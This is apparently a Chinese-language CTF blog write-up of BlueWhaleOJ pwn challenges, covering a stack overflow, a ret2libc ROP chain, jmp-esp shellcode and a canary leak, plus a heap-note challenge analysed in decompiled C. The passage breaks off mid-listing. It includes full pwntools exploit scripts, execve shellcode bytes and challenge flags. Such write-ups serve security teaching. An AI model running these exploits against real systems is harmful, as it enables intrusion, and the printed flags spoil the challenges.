    <link href="https://srpopty.github.io/2020/10/16/BlueWhaleOJ-Pwn-WriteUp-Part1/"/>
    <id>https://srpopty.github.io/2020/10/16/BlueWhaleOJ-Pwn-WriteUp-Part1/</id>
    <published>2020-10-16T07:45:29.000Z</published>
    <updated>2021-07-31T12:52:57.872Z</updated>
    
    <content type="html"><![CDATA[<h1 id="bof-32"><a href="#bof-32" class="headerlink" title="bof(32)"></a>bof(32)</h1><p>最简单的栈溢出，通过IDA分析出buf的位置在ebp-0x1c处</p><p><img src="/2020/10/16/BlueWhaleOJ-Pwn-WriteUp-Part1/1.png"></p><p>因此就可以填充0x1c+4个垃圾字节，最后的那4个字节为了覆盖ebp，之后就可以修改eip，覆盖eip为调用system函数的指令地址，即0x08048568</p><p><img src="/2020/10/16/BlueWhaleOJ-Pwn-WriteUp-Part1/2.png"></p><p>接下来就需要控制system的参数了，通过ida的string界面可以看到刚好有一个全局字符串变量”/bin/sh”，其地址位于0x0804A02C</p><p><img src="/2020/10/16/BlueWhaleOJ-Pwn-WriteUp-Part1/3.png"></p><p>system函数的参数调用是通过栈传递的，因此就可以在栈上eip的后面添加该字符串的地址，当执行完pop eip以后栈顶就是该字符串的地址了。exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;campus1.blue-whale.me&#x27;</span></span><br><span class="line">PORT = <span class="number">9990</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.update(log_level=&#x27;debug&#x27;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> len(argv) &gt; <span class="number">1</span>:</span><br><span class="line">   conn = remote(HOST, PORT)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">   conn = process(elf.path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">command = <span class="number">0x0804A02C</span></span><br><span class="line">system_addr = <span class="number">0x08048568</span></span><br><span class="line"></span><br><span class="line">conn.recv()</span><br><span class="line">conn.sendline(<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x1c</span>+<span class="number">4</span>) + p32(system_addr) + p32(command))</span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure><p>最后拿到flag为<code>ctf&#123;you_know_how_2_ove1flow&#125;</code></p><h1 id="ROP-50"><a href="#ROP-50" class="headerlink" title="ROP(50)"></a>ROP(50)</h1><p>题目中没有执行命令的函数，而且也设置了NX，所以不能通过shellcode执行命令，所以需要调用libc中的system执行shell。首先通过栈溢出可以调用puts函数输出puts在got表中的地址，拿到puts在got表中的地址后就可以获取puts在libc中的偏移，两者作差就可以算出got表的基址，拿到got表的基址以后再加上system函数在libc中的偏移就可以算出system函数在got表中的地址，这样就可以调用system函数，system的参数可以在libc中查找字符串’/bin/sh’的地址。</p><p>获取puts在got表中地址的payload为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">run_addr = <span class="number">0x80484EA</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">conn.recvuntil(<span class="string">&#x27;OP world\n&#x27;</span>)</span><br><span class="line">conn.sendline(<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x58</span>+<span class="number">4</span>) + p32(puts_plt) + p32(run_addr) + p32(puts_got))</span><br></pre></td></tr></table></figure><p>其中<code>0x58+4</code>个a是为了填充栈空间，puts_plt就是puts的地址，将puts的地址覆盖为eip就可以调用puts函数，而run_addr就是调用完puts函数的返回地址，为了不使程序结束，这里设置的0x80484EA为main函数的地址，之后栈上的内容即为puts要打印的内容的地址即puts_got，由于可能会输出很多字符，所以只需要去前四个字节即可。泄漏了puts的地址以后计算system地址的公式如下</p><p><code>system_addr = puts_addr - puts_offset + system_offset</code></p><p>其中puts_addr即为泄漏的puts地址，puts_offset和system_offset即为puts函数和system函数在libc中的偏移。最终的exp如下，最后拿到flag为<code>ctf&#123;ROP_1s_Really_Usefu11y&#125;</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;campus1.blue-whale.me&#x27;</span></span><br><span class="line">PORT = <span class="number">9991</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.update(log_level=&#x27;debug&#x27;)</span></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn2&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(argv) &gt; <span class="number">1</span>:</span><br><span class="line">   conn = remote(HOST, PORT)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">   conn = process(elf.path)</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">run_addr = <span class="number">0x80484EA</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">conn.recvuntil(<span class="string">&#x27;OP world\n&#x27;</span>)</span><br><span class="line">conn.sendline(<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x58</span>+<span class="number">4</span>) + p32(puts_plt) + p32(run_addr) + p32(puts_got))</span><br><span class="line"></span><br><span class="line">puts_addr = u32(conn.recv()[:<span class="number">4</span>])</span><br><span class="line">log.success(<span class="string">&#x27;Get puts address: &#x27;</span> + hex(puts_addr))</span><br><span class="line"></span><br><span class="line">puts_offset = libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_offset = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">str_bin_sh = libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).next()</span><br><span class="line"></span><br><span class="line">got_addr = puts_addr - puts_offset</span><br><span class="line">system_addr = got_addr + system_offset</span><br><span class="line">str_bin_sh_addr = got_addr + str_bin_sh</span><br><span class="line">log.success(<span class="string">&#x27;Get system address: &#x27;</span> + hex(system_addr))</span><br><span class="line"></span><br><span class="line">conn.sendline(<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x58</span>+<span class="number">4</span>) + p32(system_addr) + <span class="string">&#x27;a&#x27;</span>*<span class="number">4</span> + p32(str_bin_sh_addr))</span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure><h1 id="shellcode-100"><a href="#shellcode-100" class="headerlink" title="shellcode(100)"></a>shellcode(100)</h1><p>这道题目中没有可以泄漏地址的地方，但是没有设置NX，所以可以把shellcode写入栈上，但是由于开了ASLR，所以就需要利用jmp esp使控制流转向栈上的shellcode。通过ROPgadget搜索到程序中jmp esp指令的地址为0x08048667，所以构造payload为<code>&#39;a&#39;*(0x1c+4) + p32(jmp_esp) + shellcode</code>，其中0x1c+4个a为栈上的填充字节，后面加上jmp esp的地址，后面再加上shellcode即可。最终的exp如下，获取到flag为<code>ctf&#123;1-10w_d0_Jou_kn0w_sh311c0de&#125;</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;campus1.blue-whale.me&#x27;</span></span><br><span class="line">PORT = <span class="number">9992</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.update(log_level=&#x27;debug&#x27;)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn3&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(argv) &gt; <span class="number">1</span>:</span><br><span class="line">   conn = remote(HOST, PORT)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">   conn = process(elf.path)</span><br><span class="line"></span><br><span class="line">jmp_esp = <span class="number">0x08048667</span></span><br><span class="line">shellcode = <span class="string">&quot;\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80&quot;</span></span><br><span class="line"></span><br><span class="line">conn.sendlineafter(<span class="string">&#x27;input your name\n&#x27;</span>, <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x1c</span>+<span class="number">4</span>) + p32(jmp_esp) + shellcode)</span><br><span class="line">conn.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="canary-200"><a href="#canary-200" class="headerlink" title="canary(200)"></a>canary(200)</h1><p>这个题相当坑，首先题目是64位的，但是给的libc的文件中并没有64位的libc，所以得自己通过泄漏的地址搜索libc，另外如果通过system函数getshell，这个版本的libc还有字节对齐的问题。</p><p>首先通过checksec发现此题开启了NX，所以shellcode没地方写了，还开了cannary，所以首先我们就需要想办法弄到这个canary。题目所有的源码都在main函数中，而该程序主要有以下几个功能：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">welcome to buy watermelon system</span><br><span class="line">you can buy watermelon here</span><br><span class="line">1. buy a watermelon</span><br><span class="line">2. get a invoice</span><br><span class="line">3. exchange money</span><br><span class="line">4. exit</span><br></pre></td></tr></table></figure><p>主要的溢出点在第二个功能get a invoice上，这里首先会让你输入一个数字，而这个数字就是之后要读取的字符串长度。给的buf只有256个字节，所以我们就可以输入远超于256个字节的长度，就可以溢出到buf后面。首先需要想办法泄漏cannary，大概原理就是cannary的最后一个字节总是<code>\x00</code>，所以我们就可以溢出到cannary最后一个字节，覆盖掉<code>\x00</code>，这样再puts的时候就会把canary的值也给带出来，通过下图可以看到cannary的位置在rbp-0x40。</p><p><img src="/2020/10/16/BlueWhaleOJ-Pwn-WriteUp-Part1/4.png"></p><p>所以我们的paylaod长度为<code>0x148-0x48+0x8</code>再加上最后的<code>\n</code>就刚好可以覆盖到cannary</p><p><img src="/2020/10/16/BlueWhaleOJ-Pwn-WriteUp-Part1/5.png"></p><p>可以看到已经拿到了canary，在拿到canary以后我们就可以覆盖rip控制程序执行流程了。由于题目没有给64位的libc，所以我们需要自己泄漏出一个地址来找到libc的版本，payload的构成<code>payload + p64(canary) + gen.get(8*7) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(run_addr)</code></p><p>首先是cannary之前要填充的垃圾字符，后面加上cannary，后面56个字节的垃圾字符是为了填充部分寄存器，如下所示，在ret之前还会将栈上的一些数据放入寄存器中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000040086E                 add     rsp, 118h</span><br><span class="line">.text:0000000000400875                 pop     rbx</span><br><span class="line">.text:0000000000400876                 pop     rbp</span><br><span class="line">.text:0000000000400877                 pop     r12</span><br><span class="line">.text:0000000000400879                 pop     r13</span><br><span class="line">.text:000000000040087B                 pop     r14</span><br><span class="line">.text:000000000040087D                 pop     r15</span><br><span class="line">.text:000000000040087F                 retn</span><br></pre></td></tr></table></figure><p>后面是一个gadget<code>pop rdi</code>以及<code>ret</code>，64位的第一个参数是通过rdi传递的，后面加上想要泄漏的got地址，也就是puts函数的参数，再加上puts函数的地址，就可以泄漏出puts函数在运行时的真实地址了，由于payload会在main函数结束时触发，为了不使程序结束，所以需要在最后再加上一个返回地址，这里选择了main函数的地址。再拿到puts函数的真实地址以后就可以找到对应的libc为<code>libc6_2.27-3ubuntu1.2_amd64.so</code>。</p><p>获取libc以后就可以计算出got表的基址，然后算出system函数以及其参数<code>/bin/sh</code>的地址，之后的方法同上，但是这里的system有一个小坑，就是必须16字节对齐，所以就需要在调用system之前调用一次ret，使栈以16字节对齐，详情请参考<a href="http://homura.cc/blog/archives/168">关于libc-2.27中system函数的一个坑</a>。exp如下，最后拿到flag为<code>ctf&#123;st4ck_C4n41y_1s_not_secure&#125;</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;campus1.blue-whale.me&#x27;</span></span><br><span class="line">PORT = <span class="number">9993</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.update(log_level=&#x27;debug&#x27;)</span></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc6_2.27-3ubuntu1.2_amd64.so&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn4&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(argv) &gt; <span class="number">1</span>:</span><br><span class="line">    conn = remote(HOST, PORT)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    conn = process(elf.path, env=&#123;<span class="string">&#x27;LD_PRELOAD&#x27;</span>: <span class="string">&#x27;./libc6_2.27-3ubuntu1.2_amd64.so&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">overflow</span>(<span class="params">payload</span>):</span></span><br><span class="line">    conn.sendlineafter(<span class="string">&#x27;------\n&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    conn.sendlineafter(<span class="string">&#x27;input name length\n&#x27;</span>, <span class="string">&#x27;999&#x27;</span>)</span><br><span class="line">    conn.sendlineafter(<span class="string">&#x27;999&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">gen = cyclic_gen()</span><br><span class="line">payload = gen.get(<span class="number">0x148</span><span class="number">-0x48</span>+<span class="number">0x8</span>)</span><br><span class="line">overflow(payload)</span><br><span class="line">conn.recvuntil(payload)</span><br><span class="line">canary = u64(conn.recv(<span class="number">8</span>)) - <span class="number">0xa</span></span><br><span class="line">log.success(<span class="string">&#x27;Get cannary: &#x27;</span> + hex(canary))</span><br><span class="line"></span><br><span class="line">run_addr = <span class="number">0x400650</span></span><br><span class="line">ret_addr = <span class="number">0x4005b9</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x40087e</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">overflow(payload + p64(canary) + gen.get(<span class="number">8</span>*<span class="number">7</span>) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(run_addr))</span><br><span class="line"><span class="comment"># Tigger the paylaod.</span></span><br><span class="line">conn.sendlineafter(<span class="string">&#x27;------\n&#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">s = conn.recv(<span class="number">6</span>)</span><br><span class="line"><span class="keyword">while</span> len(s) &lt; <span class="number">8</span>:</span><br><span class="line">   s += <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">puts_addr = u64(s)</span><br><span class="line">log.success(<span class="string">&#x27;Get puts address: &#x27;</span> + hex(puts_addr))</span><br><span class="line"></span><br><span class="line">puts_offset = libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">got_addr = puts_addr - puts_offset </span><br><span class="line">system_offset = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">system_addr = got_addr + system_offset</span><br><span class="line">str_bin_sh = got_addr + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).next()</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">&#x27;Get system address:&#x27;</span> + hex(system_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># raw_input()</span></span><br><span class="line">overflow(payload + p64(canary) + gen.get(<span class="number">8</span>*<span class="number">7</span>) + p64(pop_rdi_ret) + p64(str_bin_sh) + p64(ret_addr) + p64(system_addr))</span><br><span class="line">conn.sendlineafter(<span class="string">&#x27;------\n&#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure><h1 id="test-200"><a href="#test-200" class="headerlink" title="test(200)"></a>test(200)</h1><p>这道题实现了一个简单的笔记功能，可以新增笔记，修改笔记与删除笔记。所有的笔记被放在一个全局变量指针数组<code>char* node[100]</code>中，并且笔记的数量由全局变量count管理，count不能大于99，每新增一篇笔记count+1并且count会作为笔记的id在删除或修改笔记时使用。新增的笔记放在malloc分配的堆中，一篇笔记长度为48字节，如下所示。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">newnote</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( count &gt; <span class="number">99</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;why you have so many notes&quot;</span>);</span><br><span class="line">  v0 = count;</span><br><span class="line">  notes[v0] = <span class="built_in">malloc</span>(<span class="number">0x30</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;input note&quot;</span>);</span><br><span class="line">  input(notes[count], <span class="number">0x30</span>);</span><br><span class="line">  <span class="keyword">return</span> count++ + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>malloc分配完成后由input函数负责读取输入并写入note中，最大写入48个字节。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">input</span><span class="params">(<span class="keyword">char</span> *note, <span class="keyword">int</span> length)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+13h] [rbp-Dh]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; length &amp;&amp; read(<span class="number">0</span>, &amp;buf, <span class="number">1u</span>LL) &gt;= <span class="number">0</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    note[i] = buf;</span><br><span class="line">    <span class="keyword">if</span> ( buf == <span class="string">&#x27;\n&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      note[i] = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>新增笔记这一块是没有什么漏洞的，再看删除笔记。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">deletenote</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;input id you want to delete&quot;</span>);</span><br><span class="line">  v1 = ret_num();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">99</span> || v1 &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;wrong id range&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !notes[v1] )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;There isn&#x27;t a note yet&quot;</span>);</span><br><span class="line">  <span class="built_in">free</span>(notes[v1]);</span><br><span class="line">  result = v1;</span><br><span class="line">  notes[v1] = <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中ret_num函数读取用户输入并且将字符串转为数字，读取用户输入的笔记ID以后再去free这个笔记，并且在free之后又将该笔记的指针赋为空指针。再看编辑笔记。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">editnote</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;input id you want to edit&quot;</span>);</span><br><span class="line">  v1 = ret_num();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">99</span> || v1 &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;wrong id range&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( notes[v1] )</span><br><span class="line">    <span class="keyword">return</span> input(notes[v1], <span class="number">80</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;You havn&#x27;t even new it yet&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在新增笔记中一篇笔记最大长度为48字节，而这里修改笔记的时候最大长度就变成了80字节，所以这里存在一个堆溢出。最后再看ret_num，该函数最多只读10个字节，所以该函数返回的最大值为9999999999，最小值为-99999999</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ret_num</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> nptr[<span class="number">24</span>]; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  *nptr = <span class="number">0L</span>L;</span><br><span class="line">  *&amp;nptr[<span class="number">8</span>] = <span class="number">0</span>;</span><br><span class="line">  input(nptr, <span class="number">10</span>);</span><br><span class="line">  <span class="keyword">return</span> atoi(nptr);</span><br><span 